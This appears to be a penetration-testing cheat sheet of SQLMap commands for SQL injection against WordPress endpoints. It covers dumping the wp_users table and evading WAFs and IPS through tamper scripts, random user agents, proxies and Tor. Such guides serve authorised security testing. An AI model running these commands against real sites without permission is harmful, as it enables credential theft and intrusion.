# SQLMap Advanced Configuration for WordPress Testing

## Table of Contents
1. [Basic Usage](#1-basic-usage)
2. [WordPress-Specific Options](#2-wordpress-specific-options)
3. [Advanced Techniques](#3-advanced-techniques)
4. [Evading Detection](#4-evading-detection)
5. [Automating Scans](#5-automating-scans)
6. [Common Scenarios](#6-common-scenarios)

---

## 1. Basic Usage

### Simple GET Request
```bash
sqlmap -u "https://example.com/page?id=1" --batch
```

### POST Request
```bash
sqlmap -u "https://example.com/wp-login.php" \
  --data="log=admin&pwd=test&wp-submit=Log+In" \
  --batch
```

### With Cookies (Authenticated Testing)
```bash
sqlmap -u "https://example.com/wp-admin/admin.php?page=test&id=1" \
  --cookie="wordpress_logged_in_xxx=yyy; wordpress_xxx=yyy" \
  --batch
```

---

## 2. WordPress-Specific Options

### Testing wp-login.php
```bash
sqlmap -u "https://example.com/wp-login.php" \
  --data="log=admin&pwd=test&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F" \
  -p log \
  --batch \
  --level=3 \
  --risk=2 \
  --technique=BEUSTQ
```

### Testing REST API
```bash
sqlmap -u "https://example.com/wp-json/wp/v2/posts?per_page=10&page=1" \
  -p per_page,page \
  --batch \
  --level=3
```

### Testing admin-ajax.php
```bash
sqlmap -u "https://example.com/wp-admin/admin-ajax.php" \
  --data="action=get_post&post_id=1" \
  -p post_id \
  --batch \
  --cookie="wordpress_logged_in_xxx=yyy"
```

### Testing Search Functionality
```bash
sqlmap -u "https://example.com/?s=test" \
  -p s \
  --batch \
  --level=3
```

### Testing Plugin Parameters
```bash
sqlmap -u "https://example.com/wp-admin/admin.php?page=my-plugin&id=1" \
  -p id \
  --cookie="wordpress_logged_in_xxx=yyy" \
  --batch \
  --level=5 \
  --risk=3
```

---

## 3. Advanced Techniques

### Specific SQL Injection Techniques

```bash
# Boolean-based blind
sqlmap -u "https://example.com/page?id=1" \
  --technique=B \
  --batch

# Error-based
sqlmap -u "https://example.com/page?id=1" \
  --technique=E \
  --batch

# Union query-based
sqlmap -u "https://example.com/page?id=1" \
  --technique=U \
  --batch

# Stacked queries
sqlmap -u "https://example.com/page?id=1" \
  --technique=S \
  --batch

# Time-based blind
sqlmap -u "https://example.com/page?id=1" \
  --technique=T \
  --batch

# All techniques
sqlmap -u "https://example.com/page?id=1" \
  --technique=BEUSTQ \
  --batch
```

### Controlling Test Depth

```bash
# Level 1-5 (default 1)
# Higher levels test more injection points (cookies, headers, etc.)
sqlmap -u "https://example.com/page?id=1" \
  --level=5 \
  --batch

# Risk 1-3 (default 1)
# Higher risk includes potentially destructive tests (OR-based, time-based)
sqlmap -u "https://example.com/page?id=1" \
  --risk=3 \
  --batch
```

### Custom Payloads

```bash
# Use custom injection point marker (*)
sqlmap -u "https://example.com/page?id=1*" \
  --batch

# Custom prefix/suffix
sqlmap -u "https://example.com/page?id=1" \
  --prefix="'" \
  --suffix="-- -" \
  --batch
```

### Database Enumeration

```bash
# Get current database
sqlmap -u "https://example.com/page?id=1" \
  --current-db \
  --batch

# List databases
sqlmap -u "https://example.com/page?id=1" \
  --dbs \
  --batch

# List tables in database
sqlmap -u "https://example.com/page?id=1" \
  -D wordpress_db \
  --tables \
  --batch

# List columns in table
sqlmap -u "https://example.com/page?id=1" \
  -D wordpress_db \
  -T wp_users \
  --columns \
  --batch

# Dump table data
sqlmap -u "https://example.com/page?id=1" \
  -D wordpress_db \
  -T wp_users \
  --dump \
  --batch
```

---

## 4. Evading Detection

### User-Agent Rotation
```bash
sqlmap -u "https://example.com/page?id=1" \
  --random-agent \
  --batch
```

### Custom User-Agent
```bash
sqlmap -u "https://example.com/page?id=1" \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --batch
```

### Tamper Scripts (WAF Bypass)
```bash
# Use space-to-comment tamper
sqlmap -u "https://example.com/page?id=1" \
  --tamper=space2comment \
  --batch

# Use multiple tamper scripts
sqlmap -u "https://example.com/page?id=1" \
  --tamper=space2comment,randomcase,between \
  --batch

# Available tamper scripts
sqlmap -u "https://example.com/page?id=1" \
  --list-tampers
```

### Common Tamper Scripts for WordPress
```bash
# Case variation
--tamper=randomcase

# Space to comment
--tamper=space2comment

# Space to random blank
--tamper=space2randomblank

# Between instead of greater than
--tamper=between

# Symbolic language
--tamper=symboliclogical

# Base64 encoding
--tamper=base64encode

# Chained tamper scripts
--tamper=space2comment,randomcase,between,space2randomblank
```

### Request Delay
```bash
# Delay between requests (seconds)
sqlmap -u "https://example.com/page?id=1" \
  --delay=1 \
  --batch

# Timeout for each request
sqlmap -u "https://example.com/page?id=1" \
  --timeout=30 \
  --batch

# Maximum retries
sqlmap -u "https://example.com/page?id=1" \
  --retries=3 \
  --batch
```

### Proxy Configuration
```bash
# HTTP proxy
sqlmap -u "https://example.com/page?id=1" \
  --proxy="http://127.0.0.1:8080" \
  --batch

# SOCKS proxy
sqlmap -u "https://example.com/page?id=1" \
  --proxy="socks5://127.0.0.1:9050" \
  --batch

# Tor (if configured)
sqlmap -u "https://example.com/page?id=1" \
  --tor \
  --tor-type=SOCKS5 \
  --check-tor \
  --batch
```

---

## 5. Automating Scans

### Form Auto-Detection
```bash
sqlmap -u "https://example.com/wp-login.php" \
  --forms \
  --batch \
  --crawl=2
```

### Crawl Website
```bash
sqlmap -u "https://example.com" \
  --crawl=3 \
  --batch \
  --forms \
  --level=2
```

### Session File (Resume Scan)
```bash
# First run
sqlmap -u "https://example.com/page?id=1" \
  --session="/tmp/sqlmap_session" \
  --batch

# Resume later
sqlmap -u "https://example.com/page?id=1" \
  --session="/tmp/sqlmap_session" \
  --batch
```

### Output Directory
```bash
sqlmap -u "https://example.com/page?id=1" \
  --output-dir="/path/to/output" \
  --batch
```

### Batch Mode
```bash
# Automatic answers to all questions
sqlmap -u "https://example.com/page?id=1" \
  --batch

# Flush session
sqlmap -u "https://example.com/page?id=1" \
  --flush-session \
  --batch
```

---

## 6. Common Scenarios

### Scenario 1: Test All wp-admin Pages
```bash
# Crawl wp-admin with authentication
sqlmap -u "https://example.com/wp-admin/" \
  --cookie="wordpress_logged_in_xxx=yyy" \
  --crawl=3 \
  --forms \
  --batch \
  --level=3
```

### Scenario 2: Test REST API Endpoints
```bash
# Test multiple API endpoints
for endpoint in posts pages comments users categories tags; do
  sqlmap -u "https://example.com/wp-json/wp/v2/${endpoint}?per_page=10" \
    -p per_page,page,search \
    --batch \
    --level=3
done
```

### Scenario 3: Test Plugin with Known Vulnerability
```bash
# If you know the vulnerable parameter
sqlmap -u "https://example.com/wp-admin/admin.php?page=vulnerable-plugin&action=view&id=1" \
  -p id \
  --cookie="wordpress_logged_in_xxx=yyy" \
  --batch \
  --level=5 \
  --risk=3 \
  --technique=BEUSTQ
```

### Scenario 4: Test Comment Form
```bash
sqlmap -u "https://example.com/wp-comments-post.php" \
  --data="comment=test&author=test&email=test@test.com&url=&submit=Post+Comment&comment_post_ID=1" \
  -p comment \
  --batch
```

### Scenario 5: Test Search with WAF
```bash
sqlmap -u "https://example.com/?s=test" \
  -p s \
  --batch \
  --tamper=space2comment,randomcase,between \
  --random-agent \
  --delay=1 \
  --level=5 \
  --risk=3
```

---

## SQLMap Output Examples

### Successful Injection Found
```
[INFO] GET parameter 'id' is vulnerable
do you want to exploit this SQL injection? [Y/n] Y
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[INFO] fetching current database
current database: 'wordpress_db'
```

### No Injection Found
```
[WARNING] GET parameter 'id' does not seem to be injectable
[WARNING] GET parameter 'page' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

### Using Tamper Script
```
[INFO] loading tamper script 'space2comment'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' vulnerable
```

---

## Troubleshooting

### Common Issues

**403 Forbidden:**
```bash
# Try with random user agent and proxy
sqlmap -u "https://example.com/page?id=1" \
  --random-agent \
  --proxy="http://127.0.0.1:8080" \
  --batch
```

**WAF/IPS Blocking:**
```bash
# Use tamper scripts and delay
sqlmap -u "https://example.com/page?id=1" \
  --tamper=space2comment,randomcase \
  --delay=2 \
  --random-agent \
  --batch
```

**Session Expired:**
```bash
# Use fresh session
sqlmap -u "https://example.com/page?id=1" \
  --flush-session \
  --batch
```

**Timeout Issues:**
```bash
# Increase timeout
sqlmap -u "https://example.com/page?id=1" \
  --timeout=60 \
  --retries=5 \
  --batch
```

---

## Resources

- [SQLMap Official Documentation](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)

---

**Remember:** Always use SQLMap responsibly and only on systems you have permission to test.
